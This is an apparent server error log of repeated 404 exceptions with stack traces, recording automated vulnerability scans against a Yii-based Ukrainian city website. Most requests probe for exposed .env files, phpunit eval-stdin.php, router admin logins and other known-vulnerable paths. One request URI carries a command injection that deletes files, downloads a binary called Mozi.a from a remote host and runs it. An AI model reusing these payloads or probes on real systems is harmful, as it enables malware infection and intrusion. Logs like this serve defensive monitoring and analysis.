+2021/06/17 20:38:28 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:38:28 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:38:28 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:38:28 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "g_book.cgi". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('g_book.cgi')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/g_book.cgi
+2021/06/17 20:38:28 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:38:29 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:38:29 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:38:29 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:38:29 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:38:29 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "gb.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('gb.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/gb.php
+2021/06/17 20:39:22 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/17 21:19:27 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "shell/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('shell/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
+2021/06/17 21:52:57 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "config/getuser". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('config/getuser')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/config/getuser?index=0
+2021/06/17 22:19:06 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "boaform/admin/formLogin". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('boaform/admin/f...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/boaform/admin/formLogin
+2021/06/17 22:21:45 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/priznachennya_mak_gps-45". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/priznachen...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/priznachennya_mak_gps-45
+2021/06/17 23:02:25 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "forum/files". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('forum/files')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/forum/files/
+2021/06/17 23:05:06 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "solr/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('solr/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/solr/
+2021/06/17 23:32:23 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/poshuk_marshrutu-52". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/poshuk_mar...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/poshuk_marshrutu-52
+2021/06/18 00:05:18 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/kontakti-36". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/kontakti-3...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/kontakti-36
+2021/06/18 00:05:20 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/kontakti-36". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/kontakti-3...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/kontakti-36
+2021/06/18 00:13:46 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "boaform/admin/formLogin". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('boaform/admin/f...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/boaform/admin/formLogin?username=ec8&psd=ec8
+2021/06/18 00:25:21 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "index_e.html". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('index_e.html')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/index_e.html
+2021/06/18 00:28:01 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "~alert". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('~alert')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/~alert
+2021/06/18 01:01:08 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "sitemap.xml". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('sitemap.xml')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/sitemap.xml
+2021/06/18 01:01:09 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".well-known/security.txt". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.well-known/sec...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.well-known/security.txt
+2021/06/18 01:05:32 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "system_api.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('system_api.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/system_api.php
+2021/06/18 01:05:32 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "c/version.js". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('c/version.js')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/c/version.js
+2021/06/18 01:05:32 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "streaming/clients_live.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('streaming/clien...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/streaming/clients_live.php
+2021/06/18 01:05:32 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "stalker_portal/c/version.js". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('stalker_portal/...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/stalker_portal/c/version.js
+2021/06/18 01:05:32 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "stream/live.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('stream/live.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/stream/live.php
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "api/jsonws/invoke". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('api/jsonws/invo...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/api/jsonws/invoke
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('vendor/phpunit/...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('vendor/phpunit/...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "solr/admin/info/system". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('solr/admin/info...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/solr/admin/info/system?wt=json
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp-content/plugins/wp-file-manager/readme.txt". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp-content/plug...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp-content/plugins/wp-file-manager/readme.txt
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "console/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('console/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/console/
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Autodiscover/Autodiscover.xml". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Autodiscover/Au...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Autodiscover/Autodiscover.xml
+2021/06/18 01:09:11 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "_ignition/execute-solution". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('_ignition/execu...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/_ignition/execute-solution
+2021/06/18 01:36:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "contacts.htm". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('contacts.htm')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/contacts.htm
+2021/06/18 02:09:24 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "boaform/admin/formLogin". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('boaform/admin/f...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/boaform/admin/formLogin
+2021/06/18 02:13:36 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "boaform/admin/formLogin". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('boaform/admin/f...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/boaform/admin/formLogin
+2021/06/18 03:33:47 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "forum/files". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('forum/files')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/forum/files/
+2021/06/18 04:02:49 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:50 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:50 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:50 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:50 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:50 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:51 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:51 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:51 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:02:51 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 04:28:16 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/priznachennya_mak_gps-45". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/priznachen...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/priznachennya_mak_gps-45
+2021/06/18 04:32:40 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/miska_kartka-71". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/miska_kart...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/miska_kartka-71
+2021/06/18 04:58:55 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "Telerik.Web.UI.WebResource.axd". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('Telerik.Web.UI....')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/Telerik.Web.UI.WebResource.axd?type=rau
+2021/06/18 05:12:04 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "forum/files". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('forum/files')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/forum/files/
+2021/06/18 05:38:43 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/opis_moduliv_v_gt-44". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/opis_modul...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/opis_moduliv_v_gt-44
+2021/06/18 06:00:30 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/z_makom_zaroblyati-41". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/z_makom_za...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/z_makom_zaroblyati-41
+2021/06/18 06:41:30 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 06:42:00 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 06:42:12 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
